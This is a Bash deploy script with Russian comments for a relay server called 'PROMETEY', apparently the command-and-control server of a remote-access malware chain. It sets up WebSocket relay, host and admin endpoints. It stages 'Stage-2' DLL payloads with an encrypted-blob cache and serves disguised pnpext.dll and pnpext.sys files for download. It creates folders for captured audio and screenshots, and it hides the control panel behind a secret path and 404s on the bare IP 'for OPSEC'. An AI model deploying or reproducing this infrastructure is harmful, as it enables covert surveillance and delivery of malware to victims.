#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║       PROMETEY — VPS2 Deploy Script  v1.0.232               ║
# ║                                                              ║
# ║  Используется для:                                           ║
# ║    — ВПС2 в цепочке: ВПС1 → ВПС2(этот) ← Клиент            ║
# ║    — Одиночного ВПС  (аналог deploy-vps.sh режим [1])       ║
# ║                                                              ║
# ║  Запуск: sudo bash deploy-vps2.sh [TURN_USER] [TURN_PASS]   ║
# ╚══════════════════════════════════════════════════════════════╝
set -e

# ── Цвета ────────────────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; W='\033[1m';    N='\033[0m'
ok()   { echo -e "  ${G}✓${N}  $*"; }
info() { echo -e "  ${C}·${N}  $*"; }
warn() { echo -e "  ${Y}!${N}  $*"; }
die()  { echo -e "\n  ${R}✗  ОШИБКА: $*${N}\n"; exit 1; }
hdr()  { echo -e "\n${W}[$1/11]${N} $2"; }

[ "$(id -u)" -eq 0 ] || die "Запустите от root: sudo bash deploy-vps2.sh"

# ── Переменные ────────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SERVICE_NAME="rdp-relay"
RELAY_DIR="/opt/remotedesk"
VENV="$RELAY_DIR/venv"
SSL_DIR="/etc/nginx/ssl-remote-desktop"
WEB_ROOT="/var/www/remote-desktop"
PYTHON_PORT=8080
TURN_USER="${1:-rdp}"
TURN_PASS="${2:-$(openssl rand -base64 12 | tr -d '/+=')}"
# ── Определение публичного IP (IPv4 предпочтительно, IPv6 как fallback) ─────
_get_server_ip() {
    local ip
    # 1. Пробуем получить IPv4 через внешние сервисы (curl -4 = только IPv4-транспорт)
    for _svc in "https://ifconfig.me" "https://api.ipify.org" "https://icanhazip.com"; do
        ip=$(curl -4 -s --max-time 6 "$_svc" 2>/dev/null | tr -d '[:space:]')
        [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && echo "$ip" && return 0
    done
    # 2. Если IPv4 не вышло — берём любой публичный IP (может быть IPv6)
    for _svc in "https://ifconfig.me" "https://api.ipify.org"; do
        ip=$(curl -s --max-time 6 "$_svc" 2>/dev/null | tr -d '[:space:]')
        [[ -n "$ip" ]] && echo "$ip" && return 0
    done
    # 3. Резерв: первый не-loopback IPv4 с интерфейсов машины
    ip=$(hostname -I 2>/dev/null | tr ' ' '\n' \
         | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' \
         | grep -v '^127\.' | head -1)
    [[ -n "$ip" ]] && echo "$ip" && return 0
    # 4. Последний резерв: первый не-loopback адрес (включая IPv6)
    hostname -I 2>/dev/null | tr ' ' '\n' \
        | grep -vE '^(127\.|::1)' | head -1
}
SERVER_IP=$(_get_server_ip)
# Если автоопределение провалилось — спросить вручную
if [[ -z "$SERVER_IP" ]]; then
    echo -e "\n  ${Y}!${N}  Не удалось определить IP автоматически."
    read -rp "  Введите публичный IP этого сервера вручную: " SERVER_IP
fi

# ── Баннер ────────────────────────────────────────────────────────────────────
clear
echo -e "${W}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║       PROMETEY  —  VPS2 Deploy  v1.0.232         ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${N}"
echo -e "  Роль:             ${G}${W}ВПС2 (полный relay + веб-панель)${N}"
echo -e "  IP этого сервера: ${C}${SERVER_IP}${N}"
echo ""
echo -e "  ${C}Мониторинг ВПС1 (необязательно):${N}"
echo -e "  Если это ВПС2 в цепочке — введите IP или домен ВПС1 для мониторинга его состояния."
echo -e "  Оставьте пустым если одиночный ВПС или если не нужен мониторинг ВПС1."
read -rp "  IP/домен ВПС1 (Enter = пропустить): " VPS1_HOST
echo ""
read -rp "  Начать установку? [Y/n]: " CONFIRM
[ "${CONFIRM,,}" = "n" ] && echo "Отменено." && exit 0
echo ""

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 1: Пакеты
# ═══════════════════════════════════════════════════════════════════════════════
hdr 1 "Установка системных пакетов..."
apt-get update -qq
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
    nginx python3 python3-pip python3-venv openssl coturn >/dev/null 2>&1
ok "nginx, python3, openssl, coturn — установлены"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 2: Python-окружение
# ═══════════════════════════════════════════════════════════════════════════════
hdr 2 "Python-окружение..."
mkdir -p "$RELAY_DIR"
if [ ! -x "$VENV/bin/python3" ]; then
    python3 -m venv "$VENV"
    ok "Виртуальное окружение создано"
else
    ok "Уже существует — обновляем зависимости"
fi
"$VENV/bin/pip" install --quiet --upgrade pip
"$VENV/bin/pip" install --quiet websockets cryptography Pillow
ok "websockets, cryptography, Pillow — установлены"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 3: server.py
# ═══════════════════════════════════════════════════════════════════════════════
hdr 3 "Копирование relay-сервера..."
[ -f "$SCRIPT_DIR/server.py" ] || die "server.py не найден в $SCRIPT_DIR"
cp "$SCRIPT_DIR/server.py" "$RELAY_DIR/server.py"
chmod +x "$RELAY_DIR/server.py"
ok "server.py → $RELAY_DIR/"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 4: SSL-сертификат
# ═══════════════════════════════════════════════════════════════════════════════
hdr 4 "SSL-сертификат (самоподписанный, 10 лет)..."
mkdir -p "$SSL_DIR"
if [ ! -f "$SSL_DIR/cert.pem" ]; then
    openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
        -keyout "$SSL_DIR/key.pem" \
        -out    "$SSL_DIR/cert.pem" \
        -subj "/CN=remote-desktop" >/dev/null 2>&1
    ok "Сертификат создан в $SSL_DIR/"
else
    ok "Сертификат уже есть, пропускаем"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 5: Stage-2 DLL-модули
# ═══════════════════════════════════════════════════════════════════════════════
hdr 5 "Stage-2 DLL-модули..."
STAGE2_DIR="$RELAY_DIR/stage2"
mkdir -p "$STAGE2_DIR" "$STAGE2_DIR/cache"
chmod 755 "$STAGE2_DIR" "$STAGE2_DIR/cache"
copied=0
if [ -d "$SCRIPT_DIR/stage2" ]; then
    for dll in "$SCRIPT_DIR/stage2"/*.dll; do
        [ -f "$dll" ] || continue
        base="$(basename "$dll")"
        cp "$dll" "$STAGE2_DIR/$base"
        info "$base"
        copied=$((copied+1))
    done
fi
# Сбросить кэш зашифрованных блобов при обновлении DLL
find "$STAGE2_DIR/cache" -name '*.bin' -delete 2>/dev/null || true
[ $copied -gt 0 ] \
    && ok "$copied DLL-модулей скопировано (кэш очищен)" \
    || warn "stage2/*.dll не найдены — хост будет работать на stage-1"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 6: Веб-панель и файлы хоста
# ═══════════════════════════════════════════════════════════════════════════════
hdr 6 "Веб-панель, файлы хоста и рабочие директории..."
# Веб-корень
mkdir -p "$WEB_ROOT/files"
chown -R www-data:www-data "$WEB_ROOT"

# Рабочие директории relay-сервера
mkdir -p "$RELAY_DIR/audio"       # записи аудио
mkdir -p "$RELAY_DIR/screenshots" # скриншоты
chmod 755 "$RELAY_DIR/audio" "$RELAY_DIR/screenshots"
ok "Директории: audio, screenshots — созданы"

if [ -f "$SCRIPT_DIR/index.html" ]; then
    cp "$SCRIPT_DIR/index.html" "$WEB_ROOT/index.html"
    ok "index.html → $WEB_ROOT/"
else
    warn "index.html не найден — разместите вручную в $WEB_ROOT/"
fi
for f in pnpext.dll pnpext.sys; do
    if [ -f "$SCRIPT_DIR/$f" ]; then
        cp "$SCRIPT_DIR/$f" "$WEB_ROOT/files/$f"
        ok "$f → $WEB_ROOT/files/"
    fi
done

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 7: Nginx
# ═══════════════════════════════════════════════════════════════════════════════
hdr 7 "Настройка nginx (панель по /panel/, прямой IP → 404)..."
[ -f "$SCRIPT_DIR/nginx.conf" ] && cp "$SCRIPT_DIR/nginx.conf" /etc/nginx/nginx.conf
rm -f /etc/nginx/sites-enabled/default

if [ -f "$SCRIPT_DIR/nginx-remote-desktop.conf" ]; then
    cp "$SCRIPT_DIR/nginx-remote-desktop.conf" /etc/nginx/sites-available/remote-desktop
    info "Использован nginx-remote-desktop.conf из дистрибутива"
else
cat > /etc/nginx/sites-available/remote-desktop << 'NGINX_EOF'
map $http_upgrade $connection_upgrade {
    default upgrade;
    '' close;
}
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 404;
}
server {
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;
    server_name _;
    ssl_certificate /etc/nginx/ssl-remote-desktop/cert.pem;
    ssl_certificate_key /etc/nginx/ssl-remote-desktop/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    root /var/www/remote-desktop;
    # Прямой доступ по IP — 404
    location = /            { return 404; }
    location = /index.html  { return 404; }
    # Секретный путь к панели (смените /panel на что-то своё для OPSEC)
    location = /panel       { return 301 /panel/; }
    location ^~ /panel/ {
        try_files /index.html =404;
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Pragma "no-cache";
    }
    # WebSocket: клиент
    location /client {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header Sec-WebSocket-Key $http_sec_websocket_key;
        proxy_set_header Sec-WebSocket-Version $http_sec_websocket_version;
        proxy_read_timeout 86400; proxy_send_timeout 86400;
        proxy_buffering off; proxy_buffer_size 64k; proxy_buffers 16 64k;
    }
    # WebSocket: хост
    location /host {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header Sec-WebSocket-Key $http_sec_websocket_key;
        proxy_set_header Sec-WebSocket-Version $http_sec_websocket_version;
        proxy_read_timeout 86400; proxy_send_timeout 86400;
        proxy_buffering off; proxy_buffer_size 64k; proxy_buffers 16 64k;
    }
    # WebSocket: admin
    location /admin {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header Sec-WebSocket-Key $http_sec_websocket_key;
        proxy_set_header Sec-WebSocket-Version $http_sec_websocket_version;
        proxy_read_timeout 86400;
    }
    # Статические ресурсы
    location / {
        try_files $uri =404;
        add_header Cache-Control "no-cache, no-store, must-revalidate";
    }
}
NGINX_EOF
fi

ln -sf /etc/nginx/sites-available/remote-desktop /etc/nginx/sites-enabled/remote-desktop
nginx -t
systemctl reload nginx
ok "nginx настроен"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 8: Systemd-сервис
# ═══════════════════════════════════════════════════════════════════════════════
hdr 8 "Systemd-сервис..."
cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
[Unit]
Description=PROMETEY WebSocket Relay
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$RELAY_DIR
ExecStart=$VENV/bin/python3 $RELAY_DIR/server.py
Restart=always
RestartSec=3
Environment=PYTHONUNBUFFERED=1
$([ -n "$VPS1_HOST" ] && echo "Environment=RDP_CHAIN_VPS1_HOST=$VPS1_HOST")
StandardOutput=journal
StandardError=journal
SyslogIdentifier=rdp-relay

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
systemctl restart "$SERVICE_NAME"
ok "Сервис rdp-relay запущен"
[ -n "$VPS1_HOST" ] && ok "Мониторинг ВПС1 включён: $VPS1_HOST"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 9: STUN/TURN (coturn)
# ═══════════════════════════════════════════════════════════════════════════════
hdr 9 "STUN/TURN сервер (coturn)..."
sed -i 's/^#TURNSERVER_ENABLED=1/TURNSERVER_ENABLED=1/' /etc/default/coturn 2>/dev/null || true
grep -q "TURNSERVER_ENABLED=1" /etc/default/coturn 2>/dev/null \
    || echo "TURNSERVER_ENABLED=1" >> /etc/default/coturn
cat > /etc/turnserver.conf << EOF
listening-port=3478
listening-ip=0.0.0.0
external-ip=$SERVER_IP
min-port=49152
max-port=65535
lt-cred-mech
user=$TURN_USER:$TURN_PASS
realm=remote-desktop
log-file=/var/log/turnserver.log
simple-log
total-quota=0
max-bps=0
stale-nonce=600
no-throttle
no-rate-limit
no-multicast-peers
no-cli
fingerprint
EOF
systemctl enable coturn >/dev/null 2>&1
systemctl restart coturn \
    || warn "coturn не запустился — это не критично для relay; проверьте: journalctl -u coturn -n 20"
ok "Coturn настроен (порт 3478)"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 10: Сетевые буферы
# ═══════════════════════════════════════════════════════════════════════════════
hdr 10 "Настройка сетевых буферов..."
for k in rmem_max wmem_max rmem_default wmem_default; do
    v=$([[ "$k" == *default ]] && echo 1048576 || echo 4194304)
    sysctl -w net.core.$k=$v >/dev/null 2>&1
    grep -q "^net.core.$k" /etc/sysctl.conf 2>/dev/null \
        && sed -i "s|^net.core.$k=.*|net.core.$k=$v|" /etc/sysctl.conf \
        || echo "net.core.$k=$v" >> /etc/sysctl.conf
done
ok "Буферы: 4MB max, 1MB default"

# ═══════════════════════════════════════════════════════════════════════════════
#  ШАГ 11: Брандмауэр
# ═══════════════════════════════════════════════════════════════════════════════
hdr 11 "Брандмауэр (ufw)..."
if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then
    ufw allow 80/tcp            >/dev/null 2>&1
    ufw allow 443/tcp           >/dev/null 2>&1
    ufw allow "${PYTHON_PORT}/tcp" >/dev/null 2>&1
    ufw allow 3478/udp          >/dev/null 2>&1
    ufw allow 3478/tcp          >/dev/null 2>&1
    ufw allow 49152:65535/udp   >/dev/null 2>&1
    ok "Открыто: 80, 443, $PYTHON_PORT, 3478, 49152-65535"
else
    ok "ufw неактивен — при необходимости откройте порты вручную"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  ИТОГИ
# ═══════════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${G}${W}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║        ✓  ВПС2 установлен и запущен!            ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${N}"
echo -e "  ${W}Веб-панель (открыть в браузере):${N}"
echo -e "  ${C}  https://${SERVER_IP}/panel/${N}"
echo ""
echo -e "  ${W}host_config.json:${N}"
echo -e "  ${Y}  \"server\":      \"${SERVER_IP}\",${N}"
echo -e "  ${Y}  \"port\":        443,${N}"
echo -e "  ${Y}  \"use_tls\":     true,${N}"
echo -e "  ${Y}  \"stun_server\": \"stun:${SERVER_IP}:3478\",${N}"
echo -e "  ${Y}  \"turn_server\": \"turn:${TURN_USER}:${TURN_PASS}@${SERVER_IP}:3478\"${N}"
echo ""
echo -e "  ${W}Полезные команды:${N}"
echo -e "    journalctl -u rdp-relay -f          ${C}# логи в реальном времени${N}"
echo -e "    systemctl status rdp-relay           ${C}# статус сервиса${N}"
echo -e "    systemctl restart rdp-relay          ${C}# перезапуск${N}"
echo -e "    nginx -t && systemctl reload nginx   ${C}# перезагрузить nginx${N}"
echo ""

# Stage-2 итог
if [ -d "$STAGE2_DIR" ]; then
    s2_dlls="$(find "$STAGE2_DIR" -maxdepth 1 -type f -name '*.dll' 2>/dev/null | wc -l)"
    [ "$s2_dlls" -gt 0 ] \
        && info "Stage-2: $s2_dlls модулей готово" \
        || warn "Stage-2: DLL не найдены (хост работает на stage-1)"
fi
echo ""
